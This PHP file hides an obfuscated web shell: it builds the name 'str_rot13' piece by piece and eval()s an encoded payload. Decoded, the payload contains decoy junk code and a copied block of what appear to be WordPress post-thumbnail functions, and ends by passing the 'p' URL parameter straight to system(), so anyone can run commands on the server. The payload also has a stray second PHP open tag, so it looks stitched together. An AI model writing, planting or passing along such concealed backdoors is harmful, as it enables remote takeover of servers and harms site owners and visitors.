<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JbeqCerff Cbfg Guhzoanvy Grzcyngr Shapgvbaf.
 *
 * Fhccbeg sbe cbfg guhzoanvyf.
 * Gurzr'f shapgvbaf.cuc zhfg pnyy nqq_gurzr_fhccbeg( 'cbfg-guhzoanvyf' ) gb hfr gurfr.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Grzcyngr
 */

/**
 * Qrgrezvarf jurgure n cbfg unf na vzntr nggnpurq.
 *
 * Sbe zber vasbezngvba ba guvf naq fvzvyne gurzr shapgvbaf, purpx bhg
 * gur {@yvax uggcf://qrirybcre.jbeqcerff.bet/gurzrf/onfvpf/pbaqvgvbany-gntf/
 * Pbaqvgvbany Gntf} negvpyr va gur Gurzr Qrirybcre Unaqobbx.
 *
 * @fvapr 2.9.0
 * @fvapr 4.4.0 `$cbfg` pna or n cbfg VQ be JC_Cbfg bowrpg.
 *
 * @cnenz vag|JC_Cbfg|ahyy $cbfg Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg vf tybony `$cbfg`.
 * @erghea obby Jurgure gur cbfg unf na vzntr nggnpurq.
 */
shapgvba unf_cbfg_guhzoanvy( $cbfg = ahyy ) {
	$guhzoanvy_vq  = trg_cbfg_guhzoanvy_vq( $cbfg );
	$unf_guhzoanvy = (obby) $guhzoanvy_vq;

	/**
	 * Svygref jurgure n cbfg unf n cbfg guhzoanvy.
	 *
	 * @fvapr 5.1.0
	 *
	 * @cnenz obby             $unf_guhzoanvy gehr vs gur cbfg unf n cbfg guhzoanvy, bgurejvfr snyfr.
	 * @cnenz vag|JC_Cbfg|ahyy $cbfg          Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg vf tybony `$cbfg`.
	 * @cnenz vag|snyfr        $guhzoanvy_vq  Cbfg guhzoanvy VQ be snyfr vs gur cbfg qbrf abg rkvfg.
	 */
	erghea (obby) nccyl_svygref( 'unf_cbfg_guhzoanvy', $unf_guhzoanvy, $cbfg, $guhzoanvy_vq );
}

/**
 * Ergevrirf gur cbfg guhzoanvy VQ.
 *
 * @fvapr 2.9.0
 * @fvapr 4.4.0 `$cbfg` pna or n cbfg VQ be JC_Cbfg bowrpg.
 * @fvapr 5.5.0 Gur erghea inyhr sbe n aba-rkvfgvat cbfg
 *              jnf punatrq gb snyfr vafgrnq bs na rzcgl fgevat.
 *
 * @cnenz vag|JC_Cbfg|ahyy $cbfg Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg vf tybony `$cbfg`.
 * @erghea vag|snyfr Cbfg guhzoanvy VQ (juvpu pna or 0 vs gur guhzoanvy vf abg frg),
 *                   be snyfr vs gur cbfg qbrf abg rkvfg.
 */
shapgvba trg_cbfg_guhzoanvy_vq( $cbfg = ahyy ) {
	$cbfg = trg_cbfg( $cbfg );

	vs ( ! $cbfg ) {
		erghea snyfr;
	}

	$guhzoanvy_vq = (vag) trg_cbfg_zrgn( $cbfg->VQ, '_guhzoanvy_vq', gehr );

	/**
	 * Svygref gur cbfg guhzoanvy VQ.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz vag|snyfr        $guhzoanvy_vq Cbfg guhzoanvy VQ be snyfr vs gur cbfg qbrf abg rkvfg.
	 * @cnenz vag|JC_Cbfg|ahyy $cbfg         Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg vf tybony `$cbfg`.
	 */
	erghea (vag) nccyl_svygref( 'cbfg_guhzoanvy_vq', $guhzoanvy_vq, $cbfg );
}

/**
 * Qvfcynlf gur cbfg guhzoanvy.
 *
 * Jura n gurzr nqqf 'cbfg-guhzoanvy' fhccbeg, n fcrpvny 'cbfg-guhzoanvy' vzntr fvmr
 * vf ertvfgrerq, juvpu qvssref sebz gur 'guhzoanvy' vzntr fvmr znantrq ivn gur
 * Frggvatf > Zrqvn fperra.
 *
 * Jura hfvat gur_cbfg_guhzoanvy() be eryngrq shapgvbaf, gur 'cbfg-guhzoanvy' vzntr
 * fvmr vf hfrq ol qrsnhyg, gubhtu n qvssrerag fvmr pna or fcrpvsvrq vafgrnq nf arrqrq.
 *
 * @fvapr 2.9.0
 *
 * @frr trg_gur_cbfg_guhzoanvy()
 *
 * @cnenz fgevat|vag[] $fvmr Bcgvbany. Vzntr fvmr. Npprcgf nal ertvfgrerq vzntr fvmr anzr, be na neenl bs
 *                           jvqgu naq urvtug inyhrf va cvkryf (va gung beqre). Qrsnhyg 'cbfg-guhzoanvy'.
 * @cnenz fgevat|neenl $ngge Bcgvbany. Dhrel fgevat be neenl bs nggevohgrf. Qrsnhyg rzcgl.
 */
shapgvba gur_cbfg_guhzoanvy( $fvmr = 'cbfg-guhzoanvy', $ngge = '' ) {
	rpub trg_gur_cbfg_guhzoanvy( ahyy, $fvmr, $ngge );
}

/**
 * Hcqngrf pnpur sbe guhzoanvyf va gur pheerag ybbc.
 *
 * @fvapr 3.2.0
 *
 * @tybony JC_Dhrel $jc_dhrel JbeqCerff Dhrel bowrpg.
 *
 * @cnenz JC_Dhrel|ahyy $jc_dhrel Bcgvbany. N JC_Dhrel vafgnapr. Qrsnhygf gb gur $jc_dhrel tybony.
 */
shapgvba hcqngr_cbfg_guhzoanvy_pnpur( $jc_dhrel = ahyy ) {
	vs ( ! $jc_dhrel ) {
		$jc_dhrel = $TYBONYF['jc_dhrel'];
	}

	vs ( $jc_dhrel->guhzoanvyf_pnpurq ) {
		erghea;
	}

	$guhzo_vqf = neenl();

	/*
	 * $jc_dhrel znl pbagnva na neenl bs cbfg bowrpgf be cbfg VQf.
	 *
	 * Guvf rafherf gur pnpur vf cevzrq sbe nyy cbfg bowrpgf gb nibvq
	 * `trg_cbfg()` pnyyf va `trg_gur_cbfg_guhzoanvy()` gevttrevat na
	 * nqqvgvbany qngnonfr pnyy sbe rnpu cbfg.
	 */
	$cnerag_cbfg_vqf = neenl();
	sbernpu ( $jc_dhrel->cbfgf nf $cbfg ) {
		vs ( $cbfg vafgnaprbs JC_Cbfg ) {
			$cnerag_cbfg_vqf[] = $cbfg->VQ;
		} ryfrvs ( vf_vag( $cbfg ) ) {
			$cnerag_cbfg_vqf[] = $cbfg;
		}
	}
	_cevzr_cbfg_pnpurf( $cnerag_cbfg_vqf, snyfr, gehr );

	sbernpu ( $jc_dhrel->cbfgf nf $cbfg ) {
		$vq = trg_cbfg_guhzoanvy_vq( $cbfg );
		vs ( $vq ) {
			$guhzo_vqf[] = $vq;
		}
	}

	vs ( ! rzcgl( $guhzo_vqf ) ) {
		_cevzr_cbfg_pnpurf( $guhzo_vqf, snyfr, gehr );
	}

	$jc_dhrel->guhzoanvyf_pnpurq = gehr;
}

/**
 * Ergevrirf gur cbfg guhzoanvy.
 *
 * Jura n gurzr nqqf 'cbfg-guhzoanvy' fhccbeg, n fcrpvny 'cbfg-guhzoanvy' vzntr fvmr
 * vf ertvfgrerq, juvpu qvssref sebz gur 'guhzoanvy' vzntr fvmr znantrq ivn gur
 * Frggvatf > Zrqvn fperra.
 *
 * Jura hfvat gur_cbfg_guhzoanvy() be eryngrq shapgvbaf, gur 'cbfg-guhzoanvy' vzntr
 * fvmr vf hfrq ol qrsnhyg, gubhtu n qvssrerag fvmr pna or fcrpvsvrq vafgrnq nf arrqrq.
 *
 * @fvapr 2.9.0
 * @fvapr 4.4.0 `$cbfg` pna or n cbfg VQ be JC_Cbfg bowrpg.
 *
 * @cnenz vag|JC_Cbfg|ahyy $cbfg Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg.  Qrsnhyg vf tybony `$cbfg`.
 * @cnenz fgevat|vag[]     $fvmr Bcgvbany. Vzntr fvmr. Npprcgf nal ertvfgrerq vzntr fvmr anzr, be na neenl bs
 *                               jvqgu naq urvtug inyhrf va cvkryf (va gung beqre). Qrsnhyg 'cbfg-guhzoanvy'.
 * @cnenz fgevat|neenl     $ngge Bcgvbany. Dhrel fgevat be neenl bs nggevohgrf. Qrsnhyg rzcgl.
 * @erghea fgevat Gur cbfg guhzoanvy vzntr gnt.
 */
shapgvba trg_gur_cbfg_guhzoanvy( $cbfg = ahyy, $fvmr = 'cbfg-guhzoanvy', $ngge = '' ) {
	$cbfg = trg_cbfg( $cbfg );

	vs ( ! $cbfg ) {
		erghea '';
	}

	$cbfg_guhzoanvy_vq = trg_cbfg_guhzoanvy_vq( $cbfg );

	/**
	 * Svygref gur cbfg guhzoanvy fvmr.
	 *
	 * @fvapr 2.9.0
	 * @fvapr 4.9.0 Nqqrq gur `$cbfg_vq` cnenzrgre.
	 *
	 * @cnenz fgevat|vag[] $fvmr    Erdhrfgrq vzntr fvmr. Pna or nal ertvfgrerq vzntr fvmr anzr, be
	 *                              na neenl bs jvqgu naq urvtug inyhrf va cvkryf (va gung beqre).
	 * @cnenz vag          $cbfg_vq Gur cbfg VQ.
	 */
	$fvmr = nccyl_svygref( 'cbfg_guhzoanvy_fvmr', $fvmr, $cbfg->VQ );

	vs ( $cbfg_guhzoanvy_vq ) {

		/**
		 * Sverf orsber srgpuvat gur cbfg guhzoanvy UGZY.
		 *
		 * Cebivqrf \"whfg va gvzr\" svygrevat bs nyy svygref va jc_trg_nggnpuzrag_vzntr().
		 *
		 * @fvapr 2.9.0
		 *
		 * @cnenz vag          $cbfg_vq           Gur cbfg VQ.
		 * @cnenz vag          $cbfg_guhzoanvy_vq Gur cbfg guhzoanvy VQ.
		 * @cnenz fgevat|vag[] $fvmr              Erdhrfgrq vzntr fvmr. Pna or nal ertvfgrerq vzntr fvmr anzr, be
		 *                                        na neenl bs jvqgu naq urvtug inyhrf va cvkryf (va gung beqre).
		 */
		qb_npgvba( 'ortva_srgpu_cbfg_guhzoanvy_ugzy', $cbfg->VQ, $cbfg_guhzoanvy_vq, $fvmr );

		vs ( va_gur_ybbc() ) {
			hcqngr_cbfg_guhzoanvy_pnpur();
		}

		$ugzy = jc_trg_nggnpuzrag_vzntr( $cbfg_guhzoanvy_vq, $fvmr, snyfr, $ngge );

		/**
		 * Sverf nsgre srgpuvat gur cbfg guhzoanvy UGZY.
		 *
		 * @fvapr 2.9.0
		 *
		 * @cnenz vag          $cbfg_vq           Gur cbfg VQ.
		 * @cnenz vag          $cbfg_guhzoanvy_vq Gur cbfg guhzoanvy VQ.
		 * @cnenz fgevat|vag[] $fvmr              Erdhrfgrq vzntr fvmr. Pna or nal ertvfgrerq vzntr fvmr anzr, be
		 *                                        na neenl bs jvqgu naq urvtug inyhrf va cvkryf (va gung beqre).
		 */
		qb_npgvba( 'raq_srgpu_cbfg_guhzoanvy_ugzy', $cbfg->VQ, $cbfg_guhzoanvy_vq, $fvmr );

	} ryfr {
		$ugzy = '';
	}

	/**
	 * Svygref gur cbfg guhzoanvy UGZY.
	 *
	 * @fvapr 2.9.0
	 *
	 * @cnenz fgevat       $ugzy              Gur cbfg guhzoanvy UGZY.
	 * @cnenz vag          $cbfg_vq           Gur cbfg VQ.
	 * @cnenz vag          $cbfg_guhzoanvy_vq Gur cbfg guhzoanvy VQ, be 0 vs gurer vfa'g bar.
	 * @cnenz fgevat|vag[] $fvmr              Erdhrfgrq vzntr fvmr. Pna or nal ertvfgrerq vzntr fvmr anzr, be
	 *                                        na neenl bs jvqgu naq urvtug inyhrf va cvkryf (va gung beqre).
	 * @cnenz fgevat|neenl $ngge              Dhrel fgevat be neenl bs nggevohgrf.
	 */
	erghea nccyl_svygref( 'cbfg_guhzoanvy_ugzy', $ugzy, $cbfg->VQ, $cbfg_guhzoanvy_vq, $fvmr, $ngge );
}

/**
 * Ergheaf gur cbfg guhzoanvy HEY.
 *
 * @fvapr 4.4.0
 *
 * @cnenz vag|JC_Cbfg|ahyy $cbfg Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg.  Qrsnhyg vf tybony `$cbfg`.
 * @cnenz fgevat|vag[]     $fvmr Bcgvbany. Ertvfgrerq vzntr fvmr gb ergevrir gur fbhepr sbe be n syng neenl
 *                               bs urvtug naq jvqgu qvzrafvbaf. Qrsnhyg 'cbfg-guhzoanvy'.
 * @erghea fgevat|snyfr Cbfg guhzoanvy HEY be snyfr vs ab vzntr vf ninvynoyr. Vs `$fvmr` qbrf abg zngpu
 *                      nal ertvfgrerq vzntr fvmr, gur bevtvany vzntr HEY jvyy or erghearq.
 */
shapgvba trg_gur_cbfg_guhzoanvy_hey( $cbfg = ahyy, $fvmr = 'cbfg-guhzoanvy' ) {
	$cbfg_guhzoanvy_vq = trg_cbfg_guhzoanvy_vq( $cbfg );

	vs ( ! $cbfg_guhzoanvy_vq ) {
		erghea snyfr;
	}

	$guhzoanvy_hey = jc_trg_nggnpuzrag_vzntr_hey( $cbfg_guhzoanvy_vq, $fvmr );

	/**
	 * Svygref gur cbfg guhzoanvy HEY.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz fgevat|snyfr     $guhzoanvy_hey Cbfg guhzoanvy HEY be snyfr vs gur cbfg qbrf abg rkvfg.
	 * @cnenz vag|JC_Cbfg|ahyy $cbfg          Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg vf tybony `$cbfg`.
	 * @cnenz fgevat|vag[]     $fvmr          Ertvfgrerq vzntr fvmr gb ergevrir gur fbhepr sbe be n syng neenl
	 *                                        bs urvtug naq jvqgu qvzrafvbaf. Qrsnhyg 'cbfg-guhzoanvy'.
	 */
	erghea nccyl_svygref( 'cbfg_guhzoanvy_hey', $guhzoanvy_hey, $cbfg, $fvmr );
}

/**
 * Qvfcynlf gur cbfg guhzoanvy HEY.
 *
 * @fvapr 4.4.0
 *
 * @cnenz fgevat|vag[] $fvmr Bcgvbany. Vzntr fvmr gb hfr. Npprcgf nal inyvq vzntr fvmr,
 *                           be na neenl bs jvqgu naq urvtug inyhrf va cvkryf (va gung beqre).
 *                           Qrsnhyg 'cbfg-guhzoanvy'.
 */
shapgvba gur_cbfg_guhzoanvy_hey( $fvmr = 'cbfg-guhzoanvy' ) {
	$hey = trg_gur_cbfg_guhzoanvy_hey( ahyy, $fvmr );

	vs ( $hey ) {
		rpub rfp_hey( $hey );
	}
}

/**
 * Ergheaf gur cbfg guhzoanvy pncgvba.
 *
 * @fvapr 4.6.0
 *
 * @cnenz vag|JC_Cbfg|ahyy $cbfg Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg vf tybony `$cbfg`.
 * @erghea fgevat Cbfg guhzoanvy pncgvba.
 */
shapgvba trg_gur_cbfg_guhzoanvy_pncgvba( $cbfg = ahyy ) {
	$cbfg_guhzoanvy_vq = trg_cbfg_guhzoanvy_vq( $cbfg );

	vs ( ! $cbfg_guhzoanvy_vq ) {
		erghea '';
	}

	$pncgvba = jc_trg_nggnpuzrag_pncgvba( $cbfg_guhzoanvy_vq );

	vs ( ! $pncgvba ) {
		$pncgvba = '';
	}

	erghea $pncgvba;
}

/**
 * Qvfcynlf gur cbfg guhzoanvy pncgvba.
 *
 * @fvapr 4.6.0
 *
 * @cnenz vag|JC_Cbfg|ahyy $cbfg Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg vf tybony `$cbfg`.
 */
shapgvba gur_cbfg_guhzoanvy_pncgvba( $cbfg = ahyy ) {
	/**
	 * Svygref gur qvfcynlrq cbfg guhzoanvy pncgvba.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz fgevat $pncgvba Pncgvba sbe gur tvira nggnpuzrag.
	 */
	rpub nccyl_svygref( 'gur_cbfg_guhzoanvy_pncgvba', trg_gur_cbfg_guhzoanvy_pncgvba( $cbfg ) );
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>